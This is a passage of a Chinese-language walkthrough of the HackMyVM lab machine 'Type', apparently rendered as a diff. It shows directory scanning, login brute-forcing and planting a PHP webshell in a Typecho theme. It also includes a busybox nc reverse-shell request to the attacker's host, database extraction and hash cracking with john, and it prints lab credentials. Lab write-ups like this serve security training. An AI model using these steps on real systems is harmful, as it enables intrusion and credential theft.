class="hljs-regexp">/2009/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2007  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2007/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2008  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2008/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2002  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2002/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2006  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2006/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2010  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2010/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2011  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2011/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2012  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2012/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2013  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2013/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2014  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2014/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2015  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2015/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2016  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2016/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2017  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2017/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2018  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2018/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">57</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2019  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2019/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">58</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2020  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2020/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">54</span>:<span class="hljs-number">58</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/2257  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/2257/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">55</span>:<span class="hljs-number">15</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - <span class="hljs-regexp">/admin  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/</span>admin/            <br>[<span class="hljs-number">02</span>:<span class="hljs-number">55</span>:<span class="hljs-number">19</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/</span>  -&gt;  http:<span class="hljs-comment">//devnotes.dsz/admin/login.php?referer=http%3A%2F%2Fdevnotes.dsz%2Fadmin%2F</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">55</span>:<span class="hljs-number">21</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/admin/i</span>ndex.php  -&gt;  http:<span class="hljs-comment">//devnotes.dsz/admin/login.php?referer=http%3A%2F%2Fdevnotes.dsz%2Fadmin%2Findex.php</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">55</span>:<span class="hljs-number">22</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - <span class="hljs-regexp">/admin/</span>login.php                                  <br>[<span class="hljs-number">02</span>:<span class="hljs-number">56</span>:<span class="hljs-number">28</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">0</span>B  - /config.inc.php                                   <br>[<span class="hljs-number">02</span>:<span class="hljs-number">56</span>:<span class="hljs-number">56</span>] <span class="hljs-number">301</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/feed  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>ndex.php<span class="hljs-regexp">/feed/</span>    <br>[<span class="hljs-number">02</span>:<span class="hljs-number">57</span>:<span class="hljs-number">13</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - <span class="hljs-regexp">/install  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/i</span>nstall/        <br>[<span class="hljs-number">02</span>:<span class="hljs-number">57</span>:<span class="hljs-number">14</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/install.php  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/</span>            <br>[<span class="hljs-number">02</span>:<span class="hljs-number">57</span>:<span class="hljs-number">14</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - <span class="hljs-regexp">/install/</span>                                         <br>[<span class="hljs-number">02</span>:<span class="hljs-number">57</span>:<span class="hljs-number">15</span>] <span class="hljs-number">302</span> -    <span class="hljs-number">0</span>B  - <span class="hljs-regexp">/install.php?profile=default  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/</span><br>[<span class="hljs-number">02</span>:<span class="hljs-number">57</span>:<span class="hljs-number">23</span>] <span class="hljs-number">200</span> -   <span class="hljs-number">15</span>KB - /LICENSE.txt                                      <br>[<span class="hljs-number">02</span>:<span class="hljs-number">58</span>:<span class="hljs-number">54</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - <span class="hljs-regexp">/usr  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/u</span>sr/                <br>[<span class="hljs-number">02</span>:<span class="hljs-number">58</span>:<span class="hljs-number">54</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - <span class="hljs-regexp">/usr/</span>                                             <br>[<span class="hljs-number">02</span>:<span class="hljs-number">58</span>:<span class="hljs-number">55</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">162</span>B  - <span class="hljs-regexp">/var  -&gt;  http:/</span><span class="hljs-regexp">/devnotes.dsz/</span>var/                <br>[<span class="hljs-number">02</span>:<span class="hljs-number">58</span>:<span class="hljs-number">55</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">548</span>B  - <span class="hljs-regexp">/var/</span>                                             <br>                                                                             <br><span class="hljs-keyword">Task</span> Completed                                                <br></code></pre></td></tr></table></figure>
+
+<p>扫到一个登录界面，用刚刚得到的两个用户名和cewl爬下来的字典进行爆破。</p>
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_bUfI6hdWPN.png" srcset="/img/loading.gif" lazyload></p>
+<p>得到凭证</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">sburro:</span>DevNotes<br></code></pre></td></tr></table></figure>
+
+<p>进入后台发现我们权限很低，无法更改主题，但之后发现草稿箱里的文本</p>
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_lX6e5QTjdw.png" srcset="/img/loading.gif" lazyload></p>
+<p>怀疑是管理员密码，尝试登录，成功。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>:<span class="hljs-number">2</span>DbYCYpXwvV9kKwO<br></code></pre></td></tr></table></figure>
+
+<p>进入管理员后台，在当前外观的index.php下填写一句话马。</p>
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_0b71QxqWJQ.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用命令id进行测试，可以看到命令成功执行。</p>
+<p><img src="/2026/04/24/HackMyVM-Type/vmware_MN7EaTVcbU.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用busybox反弹shell</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://devnotes.dsz/index.php?cmd=busybox%<span class="hljs-number">20</span>nc%<span class="hljs-number">20192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">56</span>.<span class="hljs-number">104</span>%<span class="hljs-number">204444</span>%<span class="hljs-number">20</span>-e%<span class="hljs-number">20</span>sh;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# ./penelope.py <br>[+] Listening <span class="hljs-keyword">for</span> <span class="hljs-keyword">reverse</span> shells <span class="hljs-keyword">on</span> <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">4444</span> →  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">21.128</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">56.104</span> • <span class="hljs-number">192.168</span>.<span class="hljs-number">10.150</span> • <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span> • <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span><br>➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)<br>[+] Got <span class="hljs-keyword">reverse</span> shell <span class="hljs-keyword">from</span> <span class="hljs-keyword">Type</span>-<span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span>-Linux-x86_64 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br>[+] Attempting <span class="hljs-keyword">to</span> upgrade shell <span class="hljs-keyword">to</span> PTY...<br>[+] Shell upgraded successfully <span class="hljs-keyword">using</span> /usr/bin/python3! 💪<br>[+] Interacting <span class="hljs-keyword">with</span> session [<span class="hljs-number">1</span>], Shell <span class="hljs-keyword">Type</span>: PTY, Menu key: F12 <br>[+] Logging <span class="hljs-keyword">to</span> /root/.penelope/<span class="hljs-keyword">Type</span>~<span class="hljs-number">192.168</span>.<span class="hljs-number">56.58</span>_Linux_x86_64/<span class="hljs-number">2026</span>_04_24-<span class="hljs-number">03</span>_15_02-<span class="hljs-number">976</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>/data/typecho $ <br><br></code></pre></td></tr></table></figure>
+
+<p>进行信息搜集，发现数据库。</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs ruby">/data/typecho <span class="hljs-variable">$ </span>ls<br><span class="hljs-variable constant_">LICENSE</span>.txt     admin           config.inc.php  index.php       install         install.php     typecho.zip     usr             var<br>/data/typecho <span class="hljs-variable">$ </span>cd ..<br>/data/database <span class="hljs-variable">$ </span>cat /etc/passwd<br><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">lp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">4</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">:lp</span><span class="hljs-symbol">:/var/spool/lpd</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sync:</span><span class="hljs-symbol">x:</span><span class="hljs-number">5</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:sync</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/bin/sync</span><br><span class="hljs-symbol">shutdown:</span><span class="hljs-symbol">x:</span><span class="hljs-number">6</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:shutdown</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/shutdown</span><br><span class="hljs-symbol">halt:</span><span class="hljs-symbol">x:</span><span class="hljs-number">7</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:halt</span><span class="hljs-symbol">:/sbin</span><span class="hljs-symbol">:/sbin/halt</span><br><span class="hljs-symbol">mail:</span><span class="hljs-symbol">x:</span><span class="hljs-number">8</span><span class="hljs-symbol">:</span><span class="hljs-number">12</span><span class="hljs-symbol">:mail</span><span class="hljs-symbol">:/var/mail</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">news:</span><span class="hljs-symbol">x:</span><span class="hljs-number">9</span><span class="hljs-symbol">:</span><span class="hljs-number">13</span><span class="hljs-symbol">:news</span><span class="hljs-symbol">:/usr/lib/news</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">uucp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">14</span><span class="hljs-symbol">:uucp</span><span class="hljs-symbol">:/var/spool/uucppublic</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">cron:</span><span class="hljs-symbol">x:</span><span class="hljs-number">16</span><span class="hljs-symbol">:</span><span class="hljs-number">16</span><span class="hljs-symbol">:cron</span><span class="hljs-symbol">:/var/spool/cron</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ftp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">21</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/var/lib/ftp</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">sshd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">22</span><span class="hljs-symbol">:</span><span class="hljs-number">22</span><span class="hljs-symbol">:sshd</span><span class="hljs-symbol">:/dev/null</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">games:</span><span class="hljs-symbol">x:</span><span class="hljs-number">35</span><span class="hljs-symbol">:</span><span class="hljs-number">35</span><span class="hljs-symbol">:games</span><span class="hljs-symbol">:/usr/games</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">ntp:</span><span class="hljs-symbol">x:</span><span class="hljs-number">123</span><span class="hljs-symbol">:</span><span class="hljs-number">123</span><span class="hljs-symbol">:NTP</span><span class="hljs-symbol">:/var/empty</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">guest:</span><span class="hljs-symbol">x:</span><span class="hljs-number">405</span><span class="hljs-symbol">:</span><span class="hljs-number">100</span><span class="hljs-symbol">:guest</span><span class="hljs-symbol">:/dev/null</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nobody:</span><span class="hljs-symbol">x:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:</span><span class="hljs-number">65534</span><span class="hljs-symbol">:nobody</span><span class="hljs-symbol">:/</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">klogd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">100</span><span class="hljs-symbol">:</span><span class="hljs-number">101</span><span class="hljs-symbol">:klogd</span><span class="hljs-symbol">:/dev/null</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">nginx:</span><span class="hljs-symbol">x:</span><span class="hljs-number">101</span><span class="hljs-symbol">:</span><span class="hljs-number">102</span><span class="hljs-symbol">:nginx</span><span class="hljs-symbol">:/var/lib/nginx</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">caddy:</span><span class="hljs-symbol">x:</span><span class="hljs-number">102</span><span class="hljs-symbol">:</span><span class="hljs-number">104</span><span class="hljs-symbol">:caddy</span><span class="hljs-symbol">:/var/lib/caddy</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">lighttpd:</span><span class="hljs-symbol">x:</span><span class="hljs-number">103</span><span class="hljs-symbol">:</span><span class="hljs-number">105</span><span class="hljs-symbol">:lighttpd</span><span class="hljs-symbol">:/var/www/localhost/htdocs</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">plugugly:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-number">1000</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:/home/plugugly</span><span class="hljs-symbol">:/bin/sh</span><br><span class="hljs-symbol">avahi:</span><span class="hljs-symbol">x:</span><span class="hljs-number">86</span><span class="hljs-symbol">:</span><span class="hljs-number">86</span><span class="hljs-symbol">:Avahi</span> <span class="hljs-title class_">System</span> <span class="hljs-title class_">User</span><span class="hljs-symbol">:/dev/null</span><span class="hljs-symbol">:/sbin/nologin</span><br><span class="hljs-symbol">messagebus:</span><span class="hljs-symbol">x:</span><span class="hljs-number">104</span><span class="hljs-symbol">:</span><span class="hljs-number">106</span><span class="hljs-symbol">:messagebus</span><span class="hljs-symbol">:/dev/null</span><span class="hljs-symbol">:/sbin/nologin</span><br>/data <span class="hljs-variable">$ </span>ls<br>certs     database  typecho<br>/data <span class="hljs-variable">$ </span>cd database/<br><span class="hljs-regexp">/data/database</span> <span class="hljs-variable">$ </span>ls<br>typecho.db<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># mv /root/.penelope/Type~192.168.56.58_Linux_x86_64/downloads/data/database/typecho.db .</span><br>                                                                                                                                                           <br>┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># sqlite3 typecho.db </span><br>SQLite version 3.46.1 2024-08-13 09:16:08<br>Enter <span class="hljs-string">&quot;.help&quot;</span> for usage hints.<br>sqlite&gt; .tables<br>typecho_comments       typecho_metas          typecho_users        <br>typecho_contents       typecho_options      <br>typecho_fields         typecho_relationships<br>sqlite&gt; select <span class="hljs-symbol">*</span> from typecho_users;<br>1|<span class="hljs-string">admin</span>|<span class="hljs-string">$P$B/xZAkZ342fLS1sEQwQfsXTVKiBnVG/</span>|<span class="hljs-string">admin@type.dsz</span>|<span class="hljs-string">http://type.dsz/</span>|<span class="hljs-string">admin</span>|<span class="hljs-string">1771773701</span>|<span class="hljs-string">1777000500</span>|<span class="hljs-string">1771815254</span>|<span class="hljs-string">administrator</span>|210e70dd6a261e5533998656d6682e03<br>2|<span class="hljs-string">sburro</span>|<span class="hljs-string">$P$BfS2sY4Vz6sHjC52095jVAFOjMNyuy1</span>|<span class="hljs-string">sburro@type.dsz</span>||<span class="hljs-string">sburro</span>|<span class="hljs-string">1771774529</span>|<span class="hljs-string">1777000205</span>|<span class="hljs-string">1771775693</span>|<span class="hljs-string">contributor</span>|43792074121946b7b1fc0b8942b218ac<br>3|<span class="hljs-string">plugugly</span>|<span class="hljs-string">$P$BuyKfLj9xZ0iLez6SomJNOLGx.7g.U/</span>|<span class="hljs-string">plugugly@type.dsz</span>||<span class="hljs-string">plugugly</span>|<span class="hljs-string">1771812079</span>|<span class="hljs-string">0</span>|<span class="hljs-string">0</span>|<span class="hljs-string">subscriber</span>|<br>sqlite&gt; <br><br></code></pre></td></tr></table></figure>
+
+<p>这里注意到有一个用户和系统用户同名，怀疑密码复用</p>
+<p>使用john爆破哈希</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arduino">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-meta"># john hash.txt -show</span><br>?:<span class="hljs-number">2</span>boobies<br><br><span class="hljs-number">1</span> password hash cracked, <span class="hljs-number">0</span> left<br><br></code></pre></td></tr></table></figure>
+
+<p>得到凭证</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">plugugly</span>:<span class="hljs-number">2</span>boobies<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─<span class="hljs-comment"># ssh plugugly@192.168.56.58        </span><br>The authenticity of host &#x27;192.168.56.58 (192.168.56.58)&#x27; can&#x27;t be established.<br>ED25519 key fingerprint is: SHA256:xJ90oWmr5sPR2afHz9etzSdtxINmLI+JvbwgV/iCsWY<br>This host key is known by the following other names/addresses:<br>    ~/.ssh/known_hosts:11: [hashed name]<br>    ~/.ssh/known_hosts:92: [hashed name]<br>    ~/.ssh/known_hosts:107: [hashed name]<br>    ~/.ssh/known_hosts:116: [hashed name]<br>    ~/.ssh/known_hosts:139: [hashed name]<br>    ~/.ssh/known_hosts:140: [hashed name]<br>    ~/.ssh/known_hosts:166: [hashed name]<br>    ~/.ssh/known_hosts:177: [hashed name]<br>    (2 additional names omitted)<br>Are you sure you want to continue connecting (yes/no/[fingerprint])? yes<br>Warning: Permanently added &#x27;192.168.56.58&#x27; (ED25519) to the list of known hosts.<br>plugugly<span class="hljs-meta">@192.168.56.58&#x27;s</span> password: <br>              _                          <br>__      _____|<span class="hljs-string"> </span>|<span class="hljs-string"> ___ ___  _ __ ___   ___ </span><br><span class="hljs-string">\ \ /\ / / _ \ </span>|<span class="hljs-string">/ __/ _ \</span>|<span class="hljs-string"> &#x27;_ ` _ \ / _ \</span><br><span class="hljs-string"> \ V  V /  __/ </span>|<span class="hljs-string"> (_</span>|<span class="hljs-string"> (_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  __/</span><br><span class="hljs-string">  \_/\_/ \___</span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___\___/</span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_</span>|<span class="hljs-string">\___</span>|<br>                                         <br>Type:~$ <br><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span>sudo -l<br><span class="hljs-title class_">Matching</span> <span class="hljs-title class_">Defaults</span> entries <span class="hljs-keyword">for</span> plugugly on <span class="hljs-symbol">Type:</span><br>    secure_path=/usr/local/sbin\<span class="hljs-symbol">:/usr/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>, env_keep+=<span class="hljs-title class_">XAUTHORITY</span><br><br><span class="hljs-title class_">Runas</span> <span class="hljs-keyword">and</span> <span class="hljs-title class_">Command</span>-specific defaults <span class="hljs-keyword">for</span> <span class="hljs-symbol">plugugly:</span><br>    <span class="hljs-title class_">Defaults</span>!/usr/sbin/visudo env_keep+=<span class="hljs-string">&quot;SUDO_EDITOR EDITOR VISUAL&quot;</span><br><br><span class="hljs-title class_">User</span> plugugly may run the following commands on <span class="hljs-symbol">Type:</span><br>    (<span class="hljs-title class_">ALL</span>) <span class="hljs-symbol">NOPASSWD:</span> /root/typer.py<br><span class="hljs-symbol">Type:</span>~<span class="hljs-variable">$ </span>sudo /root/typer.py<br><span class="hljs-symbol">qt.qpa.xcb:</span> could <span class="hljs-keyword">not</span> connect to display <br><span class="hljs-symbol">qt.qpa.plugin:</span> <span class="hljs-title class_">From</span> <span class="hljs-number">6.5</span>.<span class="hljs-number">0</span>, xcb-cursor0 <span class="hljs-keyword">or</span> libxcb-cursor0 is needed to load the <span class="hljs-title class_">Qt</span> xcb platform plugin.<br><span class="hljs-symbol">qt.qpa.plugin:</span> <span class="hljs-title class_">Could</span> <span class="hljs-keyword">not</span> load the <span class="hljs-title class_">Qt</span> platform plugin <span class="hljs-string">&quot;xcb&quot;</span> <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;&quot;</span> even though it was found.<br><span class="hljs-title class_">This</span> application failed to start because no <span class="hljs-title class_">Qt</span> platform plugin could be initialized. <span class="hljs-title class_">Reinstalling</span> the application may 